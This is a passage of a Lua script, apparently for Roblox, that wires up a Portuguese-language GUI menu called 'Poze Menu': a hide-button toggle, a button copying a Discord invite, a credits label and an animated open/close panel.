btnHide.MouseButton1Click:Connect(function()
    openBtn.BackgroundTransparency = (openBtn.BackgroundTransparency == 0) and 1 or 0
    btnHide.Text = (openBtn.BackgroundTransparency == 1) and "Mostrar Botão Menu" or "Esconder Botão Menu"
end)

local btnDiscord = createButton(mainPage, "Copiar Discord", 35)
btnDiscord.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/yH5vczR7wv")  -- mude para o link real
    print("Discord copiado!")
end)

local credits = Instance.new("TextLabel", mainPage)
credits.Size = UDim2.new(1, 0, 0, 15)
credits.Position = UDim2.new(0, 0, 1, -15)
credits.BackgroundTransparency = 1
credits.Text = "By : Menojz"
credits.TextColor3 = Color3.fromRGB(100, 100, 100)
credits.TextSize = 10

-- Abrir/Fechar menu
openBtn.MouseButton1Click:Connect(function()
    panel.Visible = not panel.Visible
    if panel.Visible then
        panel.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(panel, TweenInfo.new(0.2), {Size = UDim2.new(0, 300, 0, 210)}):Play()
    end
end)

print("✅ Poze Menu carregado com sucesso! (Versão corrigida)")